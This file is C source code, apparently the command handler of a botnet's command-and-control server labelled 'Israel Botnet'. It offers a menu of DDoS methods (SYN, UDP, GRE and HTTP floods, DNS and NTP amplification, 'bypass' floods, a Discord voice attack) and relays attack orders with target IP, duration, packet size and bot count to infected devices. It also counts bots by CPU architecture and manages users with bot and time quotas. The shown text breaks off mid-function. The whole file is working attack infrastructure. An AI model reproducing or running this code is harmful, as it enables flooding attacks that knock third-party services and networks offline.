#define _GNU_SOURCE
#include "headers/command_handler.h"
#include "headers/botnet.h"
#include "headers/checks.h"
#include "headers/user_handler.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <pthread.h>

#define CYAN "\033[1;36m"

static char response_buf[MAX_COMMAND_LENGTH];
static char arch_cmd_buf[512];
static int valid_bot_count = 0;

void handle_bots_command(char *response);
void handle_clear_command(char *response);
void handle_attack_command(const User *user, const char *command, char *response);
void handle_stopall_command(const User *user, char *response);
void handle_user_command(const User *user, const char *command, char *response);
void handle_adduser_command(const User *user, int client_socket);
void handle_removeuser_command(const User *user, const char *command, char *response);
void handle_kickuser_command(const User *user, const char *command, char *response);
void handle_admin_command(const User *user, char *response);
void handle_ping_command(char *response);

/*
H E L P   C O M M A N D
*/
void handle_help_command(char *response) {
    snprintf(response, MAX_COMMAND_LENGTH,
             LIGHT_BLUE "!misc - shows misc commands\r\n"
             "!methods - shows attack methods\r\n"
            "!admin - show admin and root commands\r\n"
             "!help - shows this msg\r\n" RESET);
}
/*
M I S C   C O M M A N DS
*/
void handle_misc_command(char *response) {
    snprintf(response, MAX_COMMAND_LENGTH,
             LIGHT_BLUE "!stopall - stops all atks\r\n"
             "!opthelp - see attack options\r\n"
             "!bots - list bots\r\n"
             "!user - show user or other users\r\n"
             "!clear - clear screen\r\n"
             "!exit - leave CNC\r\n" RESET);
}

/*
METHODS LIST   C O M M A N D
*/
void handle_attack_list_command(char *response) {
    snprintf(response, MAX_COMMAND_LENGTH,
             CYAN "!vse - UDP Game VSE Query Flood\r\n"
             "!raknet - RakNet UnConnectedPing flood\r\n"
             "!syn - TCP SYN+PSH Flood\r\n"
             "!socket - TCP Stream Connections Flood\r\n"
             "!http - HTTP 1.1 GET Flood\r\n"
             "!icmp - ICMP ECHO Flood\r\n"
             "!gre - GRE IP|TCP|UDP Specific Flood\r\n"
             "!udp - Plain UDP Flood\r\n"
             "!udpplain - Plain UDP Flood (FAST)\r\n"
             "!tcpack - TCP ACK Flood\r\n"
             "!tcprst - TCP RST Reset Flood\r\n"
             "!dnsamp - DNS Amplification Attack\r\n"
             "!ntpamp - NTP Amplification Attack\r\n"
             "!udpbypass - UDP Bypass Flood\r\n"
             "!tcpbypass - TCP Bypass Flood\r\n"
             "!discord - Discord UDP Voice Attack\r\n" RESET);
}

/*
OPTHELP   C O M M A N D
*/
void handle_opthelp_command(char *response) {
    snprintf(response, MAX_COMMAND_LENGTH,
             LIGHT_BLUE "Optional Arguments:\r\n"
             "psize - packet size (max: 64500-ICMP-UDP-SYN | 1492 VSE-RakNet | 1450-UDPPLAIN | 8192-GRE)\r\n"
             "srcport - srcport for UDP-SYN-GRE, Default=Random, max=65535)\r\n"
             "botcount - Limit bots to use\r\n"
             "proto - GRE Proto (tcp/udp) default=none\r\n"
             "gport - destport for GRE\r\n"
            );
             }

int is_attack_command(const char *command) {
    return strncmp(command, "!udp", 4) == 0 ||
           strncmp(command, "!syn", 4) == 0 ||
           strncmp(command, "!vse", 4) == 0 ||
           strncmp(command, "!raknet", 7) == 0 ||
           strncmp(command, "!http", 5) == 0 ||
           strncmp(command, "!socket", 7) == 0 ||
           strncmp(command, "!icmp", 5) == 0 ||
           strncmp(command, "!gre", 4) == 0 ||
           strncmp(command, "!udpplain", 9) == 0 ||
           strncmp(command, "!tcpack", 7) == 0 ||
           strncmp(command, "!tcprst", 7) == 0 ||
           strncmp(command, "!dnsamp", 7) == 0 ||
           strncmp(command, "!ntpamp", 7) == 0 ||
           strncmp(command, "!udpbypass", 9) == 0 ||
           strncmp(command, "!tcpbypass", 9) == 0 ||
           strncmp(command, "!discord", 8) == 0;
}

void handle_layer3_attack_command(const User *user, const char *command, char *response) {
    static char cmd[16], ip[32], argstr[MAX_COMMAND_LENGTH];
    static char proto[8];
    static char bot_command[MAX_COMMAND_LENGTH];
    static char *args[32];
    static int time, psize, botcount, gport, srcport;
    static int has_psize, has_botcount, has_proto, has_gport, has_srcport;
    static int arg_count;
    static int is_icmp, is_gre;
    
    memset(cmd, 0, sizeof(cmd));
    memset(ip, 0, sizeof(ip));
    memset(argstr, 0, sizeof(argstr));
    memset(proto, 0, sizeof(proto));
    memset(args, 0, sizeof(args));
    time = psize = botcount = gport = srcport = 0;
    has_psize = has_botcount = has_proto = has_gport = has_srcport = 0;
    arg_count = 0;
    is_icmp = is_gre = 0;

    if (sscanf(command, "%15s %31s %d %[^\n]", cmd, ip, &time, argstr) < 3) {        
        if (strncmp(cmd, "!gre", 4) == 0)
            snprintf(response, MAX_COMMAND_LENGTH, "\033[31m\rUsage: !gre <ipv4> <time> [options] (recommended !opthelp)\033[0m\n");
        else
            snprintf(response, MAX_COMMAND_LENGTH, "\033[31m\rUsage: %s <ipv4> <time> [options]\033[0m\n", cmd);
        return;
    }

    if (!validate_ip(ip) || time <= 0 || time > user->maxtime) {
        snprintf(response, MAX_COMMAND_LENGTH, "\033[31m\rInvalid IP or time\033[0m\n");
        return;
    }

    if (is_blacklisted(ip)) {
        if (is_private_ip(ip)) {
            snprintf(response, MAX_COMMAND_LENGTH, "\033[31m\rError: Cannot attack private/reserved IP addresses\033[0m\n");
        } else {
            snprintf(response, MAX_COMMAND_LENGTH, "\033[31m\rError: Target is blacklisted\033[0m\n");
        }
        return;
    }

    if (strlen(argstr) > 0) {
        char *saveptr = NULL;
        char *token = strtok_r(argstr, " ", &saveptr);
        while (token && arg_count < 32) {
            args[arg_count++] = token;
            token = strtok_r(NULL, " ", &saveptr);
        }
    }

    if (strncmp(cmd, "!icmp", 5) == 0) {
        is_icmp = 1;
    } else if (strncmp(cmd, "!gre", 4) == 0) {
        is_gre = 1;
        psize = 32;
    }

    for (int i = 0; i < arg_count; i++) {
        if (strncmp(args[i], "psize=", 6) == 0) {
            if (has_psize) {
                snprintf(response, MAX_COMMAND_LENGTH, "\033[31mDuplicate psize argument\033[0m\n");
                return;
            }
            const char *val = args[i] + 6;
            if (!is_valid_int(val)) {
                snprintf(response, MAX_COMMAND_LENGTH, "\033[31mInvalid psize (need int)\033[0m\n");
                return;
            }
            psize = atoi(val);
            if (is_gre) {
                if (psize <= 0 || psize > 8192) {
                    snprintf(response, MAX_COMMAND_LENGTH, "\033[31mpsize MUST be 1-8192 for gre\033[0m\n");
                    return;
                }
            } else {
                if (!validate_psize(psize, cmd)) {
                    snprintf(response, MAX_COMMAND_LENGTH, "\033[31mInvalid psize\033[0m\n");
                    return;
                }
            }
            has_psize = 1;
        } else if (strncmp(args[i], "botcount=", 9) == 0) {
            if (has_botcount) {
                snprintf(response, MAX_COMMAND_LENGTH, "\033[31mDuplicate botcount argument\033[0m\n");
                return;
            }
            const char *val = args[i] + 9;
            if (!is_valid_int(val)) {
                snprintf(response, MAX_COMMAND_LENGTH, "\033[31mInvalid botcount (need int)\033[0m\n");
                return;
            }
            botcount = atoi(val);
            if (botcount <= 0) {
                snprintf(response, MAX_COMMAND_LENGTH, "\033[31mInvalid botcount (must be > 0)\033[0m\n");
                return;
            }
            if (botcount > user->maxbots) {
                snprintf(response, MAX_COMMAND_LENGTH, "\033[31mCancelled attack, your max bots are (%d)\033[0m\n", user->maxbots);
                return;
            }
            has_botcount = 1;
        } else if (is_gre && strncmp(args[i], "srcport=", 8) == 0) {
            if (has_srcport) {
                snprintf(response, MAX_COMMAND_LENGTH, "\033[31mDuplicate srcport option\033[0m\n");
                return;
            }
            const char *val = args[i] + 8;
            if (!is_valid_int(val)) {
                snprintf(response, MAX_COMMAND_LENGTH, "\033[31mInvalid srcport (need int)\033[0m\n");
                return;
            }
            srcport = atoi(val);
            if (!validate_srcport(srcport)) {
                snprintf(response, MAX_COMMAND_LENGTH, "\033[31mInvalid srcport value (must be 1-65535)\033[0m\n");
                return;
            }
            has_srcport = 1;
        } else if (is_gre && strncmp(args[i], "proto=", 6) == 0) {
            if (has_proto) {
                snprintf(response, MAX_COMMAND_LENGTH, "\033[31mDuplicate proto option\033[0m\n");
                return;
            }
            strncpy(proto, args[i] + 6, sizeof(proto) - 1);
            proto[sizeof(proto) - 1] = '\0';
            if (strcmp(proto, "tcp") != 0 && strcmp(proto, "udp") != 0) {
                snprintf(response, MAX_COMMAND_LENGTH, "\033[31mInvalid proto value, must be tcp or udp\033[0m\n");
                return;
            }
            has_proto = 1;
        } else if (is_gre && strncmp(args[i], "gport=", 6) == 0) {
            if (has_gport) {
                snprintf(response, MAX_COMMAND_LENGTH, "\033[31mDuplicate gport argument\033[0m\n");
                return;
            }
            const char *val = args[i] + 6;
            if (!is_valid_int(val)) {
                snprintf(response, MAX_COMMAND_LENGTH, "\033[31mInvalid gport (need int)\033[0m\n");
                return;
            }
            gport = atoi(val);
            if (!validate_port(gport)) {
                snprintf(response, MAX_COMMAND_LENGTH, "\033[31mInvalid gport value (must be 1-65535)\033[0m\n");
                return;
            }
            has_gport = 1;
        } else if (!is_gre) {
            snprintf(response, MAX_COMMAND_LENGTH, "\033[31mUnknown option: %s\033[0m\n", args[i]);
            return;
        } else if (is_gre) {
            snprintf(response, MAX_COMMAND_LENGTH, "\033[31mUnknown option: %s\033[0m\n", args[i]);
            return;
        }
    }

    if (is_gre) {
        if (has_proto && !has_gport) {
            snprintf(response, MAX_COMMAND_LENGTH, "\033[31mgport= is required when proto= is set\033[0m\n");
            return;
        }
        if (!has_proto && has_gport) {
            snprintf(response, MAX_COMMAND_LENGTH, "\033[31mproto= is required when using gport=\033[0m\n");
            return;
        }
        if (has_srcport && !has_proto) {
            snprintf(response, MAX_COMMAND_LENGTH, "\033[31mproto= is required when using srcport=\033[0m\n");
            return;
        }
    }

    pthread_mutex_lock(&bot_mutex);
    int requested_bots = bot_count;
    if (has_botcount) {
        if (botcount > user->maxbots) {
            snprintf(response, MAX_COMMAND_LENGTH, "\033[31mYou have exceeded your max bots (%d)\033[0m\n", user->maxbots);
            pthread_mutex_unlock(&bot_mutex);
            return;
        }
        requested_bots = botcount;
    } else if (user->maxbots < bot_count) {
        requested_bots = user->maxbots;
    }

    int sent_bots = 0;
    for (int i = 0; i < bot_count; i++) {
        if (bots[i].is_valid) {
            if (sent_bots >= requested_bots) break;
            
            if (is_gre) {
                if (has_proto && has_srcport)
                    snprintf(bot_command, sizeof(bot_command), "%s %s %d psize=%d proto=%s gport=%d srcport=%d", 
                            cmd, ip, time, psize, proto, gport, srcport);
                else if (has_proto)
                    snprintf(bot_command, sizeof(bot_command), "%s %s %d psize=%d proto=%s gport=%d", 
                            cmd, ip, time, psize, proto, gport);
                else
                    snprintf(bot_command, sizeof(bot_command), "%s %s %d psize=%d", cmd, ip, time, psize);
            } else {
                if (has_psize)
                    snprintf(bot_command, sizeof(bot_command), "%s %s %d psize=%d", cmd, ip, time, psize);
                else
                    snprintf(bot_command, sizeof(bot_command), "%s %s %d", cmd, ip, time);
            }
            
            send(bots[i].socket, bot_command, strlen(bot_command), MSG_NOSIGNAL);
            sent_bots++;
        }
    }
    pthread_mutex_unlock(&bot_mutex);

    pthread_mutex_lock(&cooldown_mutex);
    global_cooldown = time;
    pthread_mutex_unlock(&cooldown_mutex);

    if (sent_bots > 0) {
        pthread_mutex_lock(&attack_counter_mutex);
        active_attacks++;
        int current = active_attacks;
        pthread_mutex_unlock(&attack_counter_mutex);
        
        char title[256];
        snprintf(title, sizeof(title), "\033]0;Israel Botnet - Attacks: %d/MAX\007", current);
        snprintf(response, MAX_COMMAND_LENGTH, "%s\033[32mSent instructions to %d bots\033[0m\n", title, sent_bots);
    } else {
        snprintf(response, MAX_COMMAND_LENGTH, "\033[32mSent instructions to %d bots\033[0m\n", sent_bots);
    }
}

void process_command(const User *user, const char *command, int client_socket, const char *user_ip) {
    if (strlen(command) == 0) return;

    // Normalize command to include "!" prefix if missing
    static char normalized_cmd[MAX_COMMAND_LENGTH];
    memset(normalized_cmd, 0, sizeof(normalized_cmd));
    
    if (command[0] != '!') {
        snprintf(normalized_cmd, sizeof(normalized_cmd), "!%s", command);
    } else {
        strncpy(normalized_cmd, command, sizeof(normalized_cmd) - 1);
        normalized_cmd[sizeof(normalized_cmd) - 1] = '\0';
    }

    log_command(user->user, user_ip, normalized_cmd);

    if (is_attack_command(normalized_cmd)) {
        pthread_mutex_lock(&cooldown_mutex);
        if (global_cooldown > 0) {
            snprintf(response_buf, sizeof(response_buf), LIGHT_BLUE "\rGlobal cooldown still active for " LIGHT_BLUE "%d seconds" RESET "\n", global_cooldown);
            pthread_mutex_unlock(&cooldown_mutex);
            send(client_socket, response_buf, strlen(response_buf), MSG_NOSIGNAL);
            return;
        }
        pthread_mutex_unlock(&cooldown_mutex);
    }

    if (strcmp(normalized_cmd, "!help") == 0) {
        handle_help_command(response_buf);
    } else if (strcmp(normalized_cmd, "!misc") == 0) {
        handle_misc_command(response_buf);
    } else if (strcmp(normalized_cmd, "!admin") == 0) {
        handle_admin_command(user, response_buf);
    } else if (strcmp(normalized_cmd, "!methods") == 0) {
        handle_attack_list_command(response_buf);
    } else if (strcmp(normalized_cmd, "!bots") == 0) {
        handle_bots_command(response_buf);
    } else if (strcmp(normalized_cmd, "!ping") == 0) {
        handle_ping_command(response_buf);
    } else if (strcmp(normalized_cmd, "!clear") == 0) {
        handle_clear_command(response_buf);
    } else if (strcmp(normalized_cmd, "!opthelp") == 0) {
        handle_opthelp_command(response_buf);
    } else if (strcmp(normalized_cmd, "!exit") == 0) {
        snprintf(response_buf, sizeof(response_buf), LIGHT_BLUE "\rGoodbye!\n" RESET);
        send(client_socket, response_buf, strlen(response_buf), MSG_NOSIGNAL);
        close(client_socket);
        return;
    } else if (strncmp(normalized_cmd, "!user", 5) == 0) {
        handle_user_command(user, normalized_cmd, response_buf);
    } else if (strcmp(normalized_cmd, "!adduser") == 0) {
        handle_adduser_command(user, client_socket);
        return;
    } else if (strncmp(normalized_cmd, "!removeuser", 10) == 0) {
        handle_removeuser_command(user, normalized_cmd, response_buf);
    } else if (strncmp(normalized_cmd, "!kickuser", 9) == 0) {
        handle_kickuser_command(user, normalized_cmd, response_buf);
    } else if (strncmp(normalized_cmd, "!icmp", 5) == 0 || strncmp(normalized_cmd, "!gre", 4) == 0) {
        handle_layer3_attack_command(user, normalized_cmd, response_buf);
    } else if (is_attack_command(normalized_cmd)) {
        handle_attack_command(user, normalized_cmd, response_buf);
    } else if (strcmp(normalized_cmd, "!stopall") == 0) {
        handle_stopall_command(user, response_buf);
    } else {
        snprintf(response_buf, sizeof(response_buf), LIGHT_BLUE "\rCommand not found\n" RESET);
    }

    send(client_socket, response_buf, strlen(response_buf), MSG_NOSIGNAL);
}

void handle_attack_command(const User *user, const char *command, char *response) {
    static char cmd[16], ip[32], argstr[MAX_COMMAND_LENGTH];
    static char url[256];
    static char *args[32];
    static char bot_command[MAX_COMMAND_LENGTH];
    int port = 0, time = 0, srcport = 0, psize = 0, botcount = 0;
    int has_srcport = 0, has_psize = 0, has_botcount = 0;
    int arg_count = 0;
    int is_icmp = strcmp(command, "!icmp") == 0;
    int is_http = strncmp(command, "!http", 5) == 0;

    memset(argstr, 0, sizeof(argstr));
    memset(cmd, 0, sizeof(cmd));
    memset(ip, 0, sizeof(ip));
    memset(url, 0, sizeof(url));
    memset(args, 0, sizeof(args));

    if (is_icmp) {
        if (sscanf(command, "%15s %31s %d %[^\n]", cmd, ip, &time, argstr) < 3) {
            snprintf(response, MAX_COMMAND_LENGTH, "\033[31m\rUsage: !icmp <ipv4> <time> [options]\033[0m\n");
            return;
        }
    } else if (is_http) {
        // HTTP: !http <url> <time> [options]
        if (sscanf(command, "%15s %255s %d %[^\n]", cmd, url, &time, argstr) < 3) {
            snprintf(response, MAX_COMMAND_LENGTH, "\033[31m\rUsage: !http <url> <time> [options]\033[0m\n");
            return;
        }
        
        // Parse URL to extract host and port
        char *url_copy = strdup(url);
        if (!url_copy) {
            snprintf(response, MAX_COMMAND_LENGTH, "\033[31m\rMemory allocation error\033[0m\n");
            return;
        }
        
        char *host = url_copy;
        if (strncmp(host, "http://", 7) == 0) {
            host += 7;
        } else if (strncmp(host, "https://", 8) == 0) {
            host += 8;
        }
        
        char *path = strchr(host, '/');
        if (path) *path = 0;
        
        char *port_str = strchr(host, ':');
        if (port_str) {
            *port_str = 0;
            port_str++;
            port = atoi(port_str);
        } else {
            port = 80;
        }
        
        strncpy(ip, host, sizeof(ip) - 1);
        free(url_copy);
    } else {
        if (sscanf(command, "%15s %31s %d %d %[^\n]", cmd, ip, &port, &time, argstr) < 4) {
            snprintf(response, MAX_COMMAND_LENGTH, "\033[31m\rUsage: !method <ipv4> <dport> <time> [options]\033[0m\n");
            return;
        }
    }

    if (!validate_ip(ip) || time <= 0 || time > user->maxtime) {
        snprintf(response, MAX_COMMAND_LENGTH, "\033[31m\rInvalid IP or time\033[0m\n");
        return;
    }

    if (is_blacklisted(ip)) {
        if (is_private_ip(ip)) {
            snprintf(response, MAX_COMMAND_LENGTH, "\033[31m\rError: Cannot attack private/reserved IP addresses\033[0m\n");
        } else {
            snprintf(response, MAX_COMMAND_LENGTH, "\033[31m\rError: Target is blacklisted\033[0m\n");
        }
        return;
    }

    if (!is_icmp && !is_http && !validate_port(port)) {
        snprintf(response, MAX_COMMAND_LENGTH, "\033[31m\rInvalid port\033[0m\n");
        return;
    }

    if (is_http && (port <= 0 || port > 65535)) {
        snprintf(response, MAX_COMMAND_LENGTH, "\033[31m\rInvalid HTTP port\033[0m\n");
        return;
    }

    if (strlen(argstr) > 0) {
        char *saveptr = NULL;
        char *token = strtok_r(argstr, " ", &saveptr);
        while (token && arg_count < 32) {
            args[arg_count++] = token;
            token = strtok_r(NULL, " ", &saveptr);
        }
    }

    for (int i = 0; i < arg_count; i++) {
        if (strncmp(args[i], "srcport=", 8) == 0) {
            if (has_srcport) {
                snprintf(response, MAX_COMMAND_LENGTH, "\033[31mDuplicate srcport argument\033[0m\n");
                return;
            }
            if (is_icmp || strcmp(cmd, "!vse") == 0 || strcmp(cmd, "!http") == 0 || strcmp(cmd, "!socket") == 0 || strcmp(cmd, "!raknet") == 0 || strcmp(cmd, "!udpplain") == 0) {
                snprintf(response, MAX_COMMAND_LENGTH, "\033[31msrcport not supported for this method\033[0m\n");
                return;
            }
            const char *val = args[i] + 8;
            if (!is_valid_int(val)) {
                snprintf(response, MAX_COMMAND_LENGTH, "\033[31mInvalid srcport (not an integer)\033[0m\n");
                return;
            }
            srcport = atoi(val);
            if (srcport > 0) {
                if (!validate_srcport(srcport)) {
                    snprintf(response, MAX_COMMAND_LENGTH, "\033[31mInvalid srcport!\033[0m\n");
                    return;
                }
            }
            has_srcport = 1;
        } else if (strncmp(args[i], "psize=", 6) == 0) {
            if (has_psize) {
                snprintf(response, MAX_COMMAND_LENGTH, "\033[31mDuplicate psize argument\033[0m\n");
                return;
            }
            if (!(strcmp(cmd, "!udp") == 0 || strcmp(cmd, "!syn") == 0 || strcmp(cmd, "!vse") == 0 || 
                strcmp(cmd, "!raknet") == 0 || strcmp(cmd, "!udpplain") == 0 || strcmp(cmd, "!tcpack") == 0 || 
                strcmp(cmd, "!tcprst") == 0 || strcmp(cmd, "!udpbypass") == 0 || strcmp(cmd, "!tcpbypass") == 0 || 
                strcmp(cmd, "!discord") == 0 || is_icmp)) {
                snprintf(response, MAX_COMMAND_LENGTH, "\033[31mpsize not supported for this method\033[0m\n");
                return;
            }
            const char *val = args[i] + 6;
            if (!is_valid_int(val)) {
                snprintf(response, MAX_COMMAND_LENGTH, "\033[31mInvalid psize (need int)\033[0m\n");
                return;
            }
            psize = atoi(val);
            if (!validate_psize(psize, cmd)) {
                snprintf(response, MAX_COMMAND_LENGTH, "\033[31mInvalid psize\033[0m\n");
                return;
            }
            has_psize = 1;
        } else if (strncmp(args[i], "botcount=", 9) == 0) {
            if (has_botcount) {
                snprintf(response, MAX_COMMAND_LENGTH, "\033[31mDuplicate botcount argument\033[0m\n");
                return;
            }
            const char *val = args[i] + 9;
            if (!is_valid_int(val)) {
                snprintf(response, MAX_COMMAND_LENGTH, "\033[31mInvalid botcount (need int)\033[0m\n");
                return;
            }
            botcount = atoi(val);
            if (botcount <= 0) {
                snprintf(response, MAX_COMMAND_LENGTH, "\033[31mInvalid botcount (must be > 0)\033[0m\n");
                return;
            }
            if (botcount > user->maxbots) {
                snprintf(response, MAX_COMMAND_LENGTH, "\033[31mCancelled attack, your max bots are (%d)\033[0m\n", user->maxbots);
                return;
            }
            has_botcount = 1;
        } else {
            snprintf(response, MAX_COMMAND_LENGTH, "\033[31mUnknown option: %s\033[0m\n", args[i]);
            return;
        }
    }

    pthread_mutex_lock(&bot_mutex);
    int requested_bots = bot_count;
    if (has_botcount) {
        requested_bots = botcount;
    } else if (user->maxbots < bot_count) {
        requested_bots = user->maxbots;
    }
    int sent_bots = 0;
    
    for (int i = 0; i < bot_count; i++) {
        if (bots[i].is_valid) {
            if (sent_bots >= requested_bots) break;
            
            if (is_icmp) {
                if (has_psize)
                    snprintf(bot_command, sizeof(bot_command), "%s %s %d psize=%d", cmd, ip, time, psize);
                else
                    snprintf(bot_command, sizeof(bot_command), "%s %s %d", cmd, ip, time);
            } else if (is_http) {
                snprintf(bot_command, sizeof(bot_command), "%s %s %d", cmd, ip, time);
            } else {
                if (has_srcport && has_psize)
                    snprintf(bot_command, sizeof(bot_command), "%s %s %d %d srcport=%d psize=%d", cmd, ip, port, time, srcport, psize);
                else if (has_srcport)
                    snprintf(bot_command, sizeof(bot_command), "%s %s %d %d srcport=%d", cmd, ip, port, time, srcport);
                else if (has_psize)
                    snprintf(bot_command, sizeof(bot_command), "%s %s %d %d psize=%d", cmd, ip, port, time, psize);
                else
                    snprintf(bot_command, sizeof(bot_command), "%s %s %d %d", cmd, ip, port, time);
            }
            send(bots[i].socket, bot_command, strlen(bot_command), MSG_NOSIGNAL);
            sent_bots++;
        }
    }
    pthread_mutex_unlock(&bot_mutex);

    pthread_mutex_lock(&cooldown_mutex);
    global_cooldown = time;
    pthread_mutex_unlock(&cooldown_mutex);

    if (sent_bots > 0) {
        pthread_mutex_lock(&attack_counter_mutex);
        active_attacks++;
        int current = active_attacks;
        pthread_mutex_unlock(&attack_counter_mutex);
        
        char title[256];
        snprintf(title, sizeof(title), "\033]0;Israel Botnet - Attacks: %d/MAX\007", current);
        snprintf(response, MAX_COMMAND_LENGTH, "%s\033[32mSent instructions to %d bots\033[0m\n", title, sent_bots);
    } else {
        snprintf(response, MAX_COMMAND_LENGTH, "\033[32mSent instructions to %d bots\033[0m\n", sent_bots);
    }
}

void handle_bots_command(char *response) {
    #define NUM_ARCHS 13
    static int arch_count[NUM_ARCHS];
    static const char* arch_names[] = {"mips", "mipsel", "x86_64", "aarch64", "arm", "m68k", "i686", "sparc", "powerpc64", "sh4", "armhf", "arc700", "unknown"};
    static int valid_bots;
    int offset;
    
    memset(arch_count, 0, sizeof(arch_count));
    valid_bots = 0;
    
    pthread_mutex_lock(&bot_mutex);
    for (int i = 0; i < bot_count; i++) {
        if (!bots[i].is_valid) continue;
        
        int is_duplicate = 0;
        for (int j = 0; j < i; j++) {
            if (bots[j].is_valid && bots[j].address.sin_addr.s_addr == bots[i].address.sin_addr.s_addr) {
                is_duplicate = 1;
                break;
            }
        }
        if (is_duplicate) continue;
        
        valid_bots++;
        int found = 0;
        for (int j = 0; j < NUM_ARCHS-1 && !found; j++) {
            if (bots[i].arch != NULL && strcmp(bots[i].arch, arch_names[j]) == 0) {
                arch_count[j]++;
                found = 1;
            }
        }
        if (!found) {
            arch_count[NUM_ARCHS-1]++;
        }
    }
    pthread_mutex_unlock(&bot_mutex);

    offset = snprintf(response, MAX_COMMAND_LENGTH, LIGHT_BLUE "Total bots: %d\n" RESET, valid_bots);
    for (int i = 0; i < NUM_ARCHS; i++) {
        if (arch_count[i] > 0) {
            offset += snprintf(response + offset, MAX_COMMAND_LENGTH - offset, CYAN "\r%s: %d\r\n" RESET, arch_names[i], arch_count[i]);
        }
    }
}

void handle_clear_command(char *response) {
    snprintf(response, MAX_COMMAND_LENGTH, "\033[H\033[J");
}

void handle_stopall_command(const User *user, char *response) {
    static int allow_stopall;
    static int stopped_count;
    static const char stop_cmd[] = "stop";
    
    allow_stopall = 0;
    stopped_count = 0;
    
    if (user->is_admin) {
        allow_stopall = 1;
    } else {
        FILE* sf = fopen("database/settings.txt", "r");
        if (sf) {
            char line[128] = {0};
            while (fgets(line, sizeof(line), sf)) {
                if (strncmp(line, "globalstopall:", 13) == 0) {
                    allow_stopall = strstr(line, "yes") ? 1 : 0;
                    break;
                }
            }
            fclose(sf);
        }
    }

    if (!allow_stopall) {
        snprintf(response, MAX_COMMAND_LENGTH, "\r" LIGHT_BLUE "Error: You don't have permission to use !stopall\n" RESET);
        return;
    }

    pthread_mutex_lock(&bot_mutex);
    for (int i = 0; i < bot_count; i++) {
        if (bots[i].is_valid && bots[i].socket > 0) {
            if (send(bots[i].socket, stop_cmd, strlen(stop_cmd), MSG_NOSIGNAL) > 0) {
                stopped_count++;
            }
        }
    }
    pthread_mutex_unlock(&bot_mutex);
    
    pthread_mutex_lock(&cooldown_mutex);
    global_cooldown = 0;
    pthread_mutex_unlock(&cooldown_mutex);
    
    if (stopped_count > 0) {
        pthread_mutex_lock(&attack_counter_mutex);
        active_attacks = 0;
        pthread_mutex_unlock(&attack_counter_mutex);
        
        char title[256];
        snprintf(title, sizeof(title), "\033]0;Israel Botnet - Attacks: 0/MAX\007");
        snprintf(response, MAX_COMMAND_LENGTH, "%s\r" LIGHT_BLUE "Sent stop command to %d active bots\n" RESET, title, stopped_count);
    } else {
        snprintf(response, MAX_COMMAND_LENGTH, "\r" LIGHT_BLUE "Sent stop command to %d active bots\n" RESET, stopped_count);
    }
}

void handle_user_command(const User *user, const char *command, char *response) {
    if (!user->is_admin) {
        FILE *sf = fopen("database/settings.txt", "r");
        int allow_non_admin = 0;
        if (sf) {
            char line[128];
            while (fgets(line, sizeof(line), sf)) {
                if (strncmp(line, "globalusercommand:", 17) == 0 && strstr(line, "yes")) {
                    allow_non_admin = 1;
                    break;
                }
            }
            fclose(sf);
        }
        if (!allow_non_admin) {
            snprintf(response, MAX_COMMAND_LENGTH, LIGHT_BLUE "Only admins can use !user command\r\n" RESET);
            return;
        }
    }
    
    char target_user[50] = {0};
    if (sscanf(command, "!user %49s", target_user) == 1) {
        int found = 0;
        for (int i = 0; i < user_count; i++) {
            if (strcmp(users[i].user, target_user) == 0) {
                snprintf(response, MAX_COMMAND_LENGTH,
                    LIGHT_BLUE "Username: %s\r\n"
                    "Max time: %d\r\n"
                    "Max bots: %d\r\n"
                    "Admin: %s\r\n"
                    "Connected: %s\r\n" RESET,
                    users[i].user,
                    users[i].maxtime,
                    users[i].maxbots,
                    users[i].is_admin ? "yes" : "no",
                    users[i].is_logged_in ? "yes" : "no");
                found = 1;
                break;
            }
        }
        if (!found) {
            snprintf(response, MAX_COMMAND_LENGTH, LIGHT_BLUE "User not found\r\n" RESET);
        }
    } else {
        snprintf(response, MAX_COMMAND_LENGTH,
            LIGHT_BLUE "Username: %s\r\n"
            "Max time: %d\r\n"
            "Max bots: %d\r\n"
            "Admin: %s\r\n"
            "Connected: yes\r\n" RESET,
            user->user,
            user->maxtime,
            user->maxbots,
            user->is_admin ? "yes" : "no");
    }
}

void handle_adduser_command(const User *user, int client_socket) {
    static char response[MAX_COMMAND_LENGTH];
    static char buffer[128];
    static char newuser[50];
    static char newpass[50];
    static char rootuser[50];
    static int maxtime, maxbots, is_admin;
    static int is_root;
    static ssize_t len;
    
    memset(newuser, 0, sizeof(newuser));
    memset(newpass, 0, sizeof(newpass));
    memset(rootuser, 0, sizeof(rootuser));
    is_root = 0;
    
    FILE *sf = fopen("database/settings.txt", "r");
    if (sf) {
        char line[128];
        while (fgets(line, sizeof(line), sf)) {
            if (strncmp(line, "rootuser:", 9) == 0) {
                sscanf(line + 9, " %49s", rootuser);
                if (strcmp(user->user, rootuser) == 0) {
                    is_root = 1;
                }
                break;
            }
        }
        fclose(sf);
    }

    if (!is_root) {
        snprintf(response, sizeof(response), LIGHT_BLUE "Only root user can add users\r\n" RESET);
        send(client_socket, response, strlen(response), MSG_NOSIGNAL);
        return;
    }

    snprintf(response, sizeof(response), LIGHT_BLUE "Username: " RESET);
    send(client_socket, response, strlen(response), MSG_NOSIGNAL);
    
    if ((len = recv(client_socket, buffer, sizeof(buffer)-1, 0)) <= 0) return;
    buffer[len] = 0;

    int uidx = 0;
    for (int i = 0; i < len && uidx < 49; i++) {
        char c = buffer[i];
        if (c == '\r' || c == '\n') break;
        if ((c >= 'a' && c <= 'z') || (c >= 'A' && c <= 'Z') || 
            (c >= '0' && c <= '9') || c == '_') {
            newuser[uidx++] = c;
        }
    }
    newuser[uidx] = 0;

    if (strlen(newuser) < 3) {
        snprintf(response, sizeof(response), LIGHT_BLUE "Username must be at least 3 characters (letters, numbers, underscore)\r\n" RESET);
        send(client_socket, response, strlen(response), MSG_NOSIGNAL);
        return;
    }

    for (int i = 0; i < user_count; i++) {
        if (strcmp(users[i].user, newuser) == 0) {
            snprintf(response, sizeof(response), LIGHT_BLUE "User already exists\r\n" RESET);
            send(client_socket, response, strlen(response), MSG_NOSIGNAL);
            return;
        }
    }

    snprintf(response, sizeof(response), LIGHT_BLUE "Password: " RESET);
    send(client_socket, response, strlen(response), MSG_NOSIGNAL);
    
    if ((len = recv(client_socket, buffer, sizeof(buffer)-1, 0)) <= 0) return;
    buffer[len] = 0;

    int pidx = 0;
    for (int i = 0; i < len && pidx < 49; i++) {
        char c = buffer[i];
        if (c == '\r' || c == '\n') break;
        if (c >= 32 && c <= 126) {  // avoids code injections like \x90 etc
            newpass[pidx++] = c;
        }
    }
    newpass[pidx] = 0;

    if (strlen(newpass) < 4) {
